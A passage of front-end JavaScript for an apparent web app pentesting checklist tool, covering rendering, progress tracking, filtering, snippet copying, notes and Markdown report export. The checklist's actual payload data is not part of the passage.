    const li = document.createElement("li");
    li.className = "nav-item";
    const isComplete = catTotal > 0 && catDone === catTotal;
    li.innerHTML = `
      <a href="#${cat.id}" class="${isComplete ? "complete" : ""}">
        <span class="nav-code">${cat.num}</span>
        <span class="nav-title">${escapeHtml(cat.title)}</span>
        <span class="nav-count">${catDone}/${catTotal}</span>
      </a>
    `;
    navList.appendChild(li);
  });

  const pct = totalItems > 0 ? Math.round((totalDone / totalItems) * 100) : 0;
  document.getElementById("progress-ratio").textContent = `${totalDone} / ${totalItems}`;
  document.getElementById("progress-pct").textContent = `${pct}%`;
  document.getElementById("progress-fill").style.width = `${pct}%`;
  document.getElementById("stat-remaining").textContent = `${totalItems - totalDone} remaining`;
  document.getElementById("stat-flagged").textContent = `${totalFlagged} flagged`;
}

function renderChecklist() {
  const categories = getActiveCategories();
  renderSidebar(categories);

  const container = document.getElementById("checklist-container");
  container.innerHTML = "";

  let visibleCount = 0;

  categories.forEach(cat => {
    const filteredItems = cat.items.filter(matchesFilters);
    if (filteredItems.length === 0) return;

    visibleCount += filteredItems.length;

    const catDone = cat.items.filter(i => !!state.checked[i.key]).length;
    const sectionEl = document.createElement("section");
    sectionEl.className = "category-block";
    sectionEl.id = cat.id;

    const allCategoryDone = cat.items.every(i => !!state.checked[i.key]);

    sectionEl.innerHTML = `
      <header class="category-header">
        <div class="category-title-group">
          <span class="category-num">${cat.num}</span>
          <h2 class="category-title">${escapeHtml(cat.title)}</h2>
        </div>
        <div class="category-meta">
          <span>${catDone} of ${cat.items.length} checked</span>
          <button type="button" class="category-action" data-cat-toggle="${cat.id}">
            ${allCategoryDone ? "Uncheck section" : "Mark section done"}
          </button>
        </div>
      </header>
      <div class="check-list"></div>
    `;

    const listEl = sectionEl.querySelector(".check-list");

    filteredItems.forEach(item => {
      const isDone = !!state.checked[item.key];
      const isFlagged = !!state.flagged[item.key];
      const isOpen = !!state.openItems[item.key];
      const noteVal = state.notes[item.key] || "";

      const itemEl = document.createElement("article");
      itemEl.className = [
        "check-item",
        isDone ? "is-done" : "",
        isFlagged ? "is-flagged" : "",
        isOpen ? "is-open" : ""
      ]
        .filter(Boolean)
        .join(" ");
      itemEl.dataset.key = item.key;

      const snippetsHtml = (item.snippets || [])
        .map((snip, idx) => {
          const interpolated = interpolateTarget(snip.code);
          return `
            <div class="code-block-wrap">
              <div class="code-block-header">
                <span>${escapeHtml(snip.label)}</span>
                <button type="button" class="copy-btn" data-copy-idx="${idx}">Copy</button>
              </div>
              <pre class="code-block">${escapeHtml(interpolated)}</pre>
            </div>
          `;
        })
        .join("");

      const rightColumnContent = snippetsHtml
        ? `
          <div class="drawer-col">
            <div class="drawer-col-title">Commands, Payloads &amp; Verification</div>
            ${snippetsHtml}
            <div class="look-for-box">
              <strong>What to Look For (Positive Finding)</strong>
              ${escapeHtml(item.indicator)}
            </div>
          </div>
        `
        : `
          <div class="drawer-col">
            <div class="drawer-col-title">Verification Goal</div>
            <div class="look-for-box">
              <strong>Completion Criteria</strong>
              ${escapeHtml(item.indicator)}
            </div>
          </div>
        `;

      itemEl.innerHTML = `
        <div class="check-row" data-row-toggle="${item.key}">
          <div class="check-box-cell">
            <button
              type="button"
              class="check-box"
              data-check-toggle="${item.key}"
              aria-label="Toggle completed for ${escapeHtml(item.title)}"
              title="Mark completed"
            >✓</button>
          </div>
          <div class="check-ref">${escapeHtml(item.ref)}</div>
          <div class="check-main">
            <div class="check-title-line">
              <span class="check-title">${escapeHtml(item.title)}</span>
              <span class="badge ${item.badgeClass}">${escapeHtml(item.badge)}</span>
              ${item.optional ? '<span class="badge badge-opt">OPTIONAL</span>' : ""}
              ${noteVal ? '<span class="badge">HAS NOTE</span>' : ""}
            </div>
            <p class="check-summary">${escapeHtml(item.summary)}</p>
          </div>
          <div class="check-actions">
            <button
              type="button"
              class="flag-btn"
              data-flag-toggle="${item.key}"
              title="Flag finding or follow-up"
            >${isFlagged ? "FLAGGED" : "Flag"}</button>
            <span class="expand-indicator">${isOpen ? "Hide −" : "How to +"}</span>
          </div>
        </div>
        <div class="check-drawer">
          <div class="drawer-grid">
            <div class="drawer-col">
              <div class="drawer-col-title">How to Check (Step-by-Step)</div>
              <ol class="steps-list">
                ${(item.steps || []).map(s => `<li>${s}</li>`).join("")}
              </ol>
            </div>
            ${rightColumnContent}
          </div>
          <div class="note-row">
            <label class="note-label" for="note-${item.key}">Lab / Target Notes:</label>
            <input
              id="note-${item.key}"
              type="text"
              class="note-input"
              data-note-input="${item.key}"
              placeholder="Record vulnerable endpoint, payload, or credentials found..."
              value="${escapeHtml(noteVal)}"
            />
          </div>
        </div>
      `;

      listEl.appendChild(itemEl);
    });

    container.appendChild(sectionEl);
  });

  if (visibleCount === 0) {
    container.innerHTML = `
      <div class="empty-state">
        No checklist items match your current filter or search query.
      </div>
    `;
  }
}

function updateControlsUI() {
  document.documentElement.setAttribute("data-theme", state.theme);
  const themeBtn = document.getElementById("theme-toggle");
  themeBtn.textContent = state.theme === "dark" ? "Theme: Dark" : "Theme: Paper";

  document.querySelectorAll("[data-view-mode]").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.viewMode === state.viewMode);
  });

  document.querySelectorAll("[data-status-filter]").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.statusFilter === state.statusFilter);
  });
}

function exportMarkdownReport() {
  const categories = getActiveCategories();
  const lines = [
    `# Web App Pentesting Checklist — ${getTargetUrl()}`,
    `Generated: ${new Date().toISOString().slice(0, 10)}`,
    `Mode: ${state.viewMode === "pentest" ? "Pentest Methodology (31 Checks)" : "Full Course Syllabus (81 Items)"}`,
    ""
  ];

  categories.forEach(cat => {
    lines.push(`## ${cat.num} ${cat.title}`);
    cat.items.forEach(item => {
      const done = !!state.checked[item.key];
      const flagged = !!state.flagged[item.key];
      const note = (state.notes[item.key] || "").trim();
      const mark = done ? "x" : " ";
      const flagStr = flagged ? " [FLAGGED]" : "";
      lines.push(`- [${mark}] **${item.ref} ${item.title}**${flagStr}`);
      if (note) {
        lines.push(`  - Note: ${note}`);
      }
    });
    lines.push("");
  });

  const blob = new Blob([lines.join("\n")], { type: "text/markdown;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `pentest-checklist-${getTargetHost().replace(/[^a-zA-Z0-9.-]/g, "_")}.md`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function init() {
  const targetInput = document.getElementById("target-input");
  const searchInput = document.getElementById("search-input");

  targetInput.value = state.targetUrl;
  searchInput.value = state.searchQuery;

  updateControlsUI();
  renderChecklist();

  // Target URL live interpolation
  targetInput.addEventListener("input", e => {
    state.targetUrl = e.target.value;
    saveState();
    renderChecklist();
  });

  // Search filter
  searchInput.addEventListener("input", e => {
    state.searchQuery = e.target.value;
    saveState();
    renderChecklist();
  });

  // View mode switch (Pentest Checklist vs. Full Course Syllabus)
  document.querySelectorAll("[data-view-mode]").forEach(btn => {
    btn.addEventListener("click", () => {
      state.viewMode = btn.dataset.viewMode;
      saveState();
      updateControlsUI();
      renderChecklist();
    });
  });

  // Status filter switch
  document.querySelectorAll("[data-status-filter]").forEach(btn => {
    btn.addEventListener("click", () => {
      state.statusFilter = btn.dataset.statusFilter;
      saveState();
      updateControlsUI();
      renderChecklist();
    });
  });

  // Theme switch
  document.getElementById("theme-toggle").addEventListener("click", () => {
    state.theme = state.theme === "dark" ? "light" : "dark";
    saveState();
    updateControlsUI();
  });

  // Expand All / Collapse All
  document.getElementById("expand-all-btn").addEventListener("click", () => {
    const categories = getActiveCategories();
    const allItems = categories.flatMap(c => c.items);
    const allOpen = allItems.every(i => !!state.openItems[i.key]);
    allItems.forEach(i => {
      state.openItems[i.key] = !allOpen;
    });
    saveState();
    renderChecklist();
  });

  // Export Markdown
  document.getElementById("export-btn").addEventListener("click", exportMarkdownReport);

  // Reset Progress
  document.getElementById("reset-btn").addEventListener("click", () => {
    if (!window.confirm("Reset all checked items, flags, and notes?")) return;
    state.checked = {};
    state.flagged = {};
    state.notes = {};
    saveState();
    renderChecklist();
  });

  // Delegated clicks inside checklist container
  const container = document.getElementById("checklist-container");

  container.addEventListener("click", e => {
    // 1. Check toggle
    const checkBtn = e.target.closest("[data-check-toggle]");
    if (checkBtn) {
      e.stopPropagation();
      const key = checkBtn.dataset.checkToggle;
      state.checked[key] = !state.checked[key];
      saveState();
      renderChecklist();
      return;
    }

    // 2. Flag toggle
    const flagBtn = e.target.closest("[data-flag-toggle]");
    if (flagBtn) {
      e.stopPropagation();
      const key = flagBtn.dataset.flagToggle;
      state.flagged[key] = !state.flagged[key];
      saveState();
      renderChecklist();
      return;
    }

    // 3. Category mark all done/undone
    const catBtn = e.target.closest("[data-cat-toggle]");
    if (catBtn) {
      const catId = catBtn.dataset.catToggle;
      const cat = getActiveCategories().find(c => c.id === catId);
      if (cat) {
        const allDone = cat.items.every(i => !!state.checked[i.key]);
        cat.items.forEach(i => {
          state.checked[i.key] = !allDone;
        });
        saveState();
        renderChecklist();
      }
      return;
    }

    // 4. Copy snippet button
    const copyBtn = e.target.closest(".copy-btn");
    if (copyBtn) {
      e.stopPropagation();
      const pre = copyBtn.closest(".code-block-wrap").querySelector(".code-block");
      if (pre && navigator.clipboard) {
        navigator.clipboard.writeText(pre.textContent).then(() => {
          const orig = copyBtn.textContent;
          copyBtn.textContent = "Copied";
          setTimeout(() => {
            copyBtn.textContent = orig;
          }, 1200);
        });
      }
      return;
    }

    // 5. Row click -> expand/collapse drawer
    const row = e.target.closest("[data-row-toggle]");
    if (row) {
      const key = row.dataset.rowToggle;
      state.openItems[key] = !state.openItems[key];
      saveState();
      renderChecklist();
    }
  });

  // Delegated note input saving
  container.addEventListener("input", e => {
    const noteInput = e.target.closest("[data-note-input]");
    if (noteInput) {
      const key = noteInput.dataset.noteInput;
      state.notes[key] = noteInput.value;
      saveState();
    }
  });
}

document.addEventListener("DOMContentLoaded", init);
